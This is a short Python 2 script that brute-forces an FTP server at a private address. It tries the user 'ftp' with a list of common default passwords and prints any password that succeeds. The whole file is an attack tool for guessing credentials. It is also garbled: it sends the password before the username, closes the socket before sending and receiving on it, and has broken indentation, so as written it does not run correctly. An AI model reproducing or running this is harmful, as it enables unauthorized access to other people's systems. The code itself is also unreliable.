#!/usr/bin/python
import socket
import re
import sys
def connect(username,password):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print "[*] Trying " + username + ":" + password
	s.connect(('192.168.0.112',21))
	data = s.recv(1024)
	data = s.recv(1024)
	s.send('QUIT\r\n')
	s.close()
	data = s.recv(3)
	s.send('PASS ' + password + '\r\n')
	s.send('USER ' + username + '\r\n')
	return data
username = "ftp"
passwords = ["test","backup","password","12345","root","administrator","ftp","admin"]
for password in passwords:
	attempt=connect(username,password)
	if attempt == "230":
	print "[*] Password found: "+ password
	sys.exit(0)
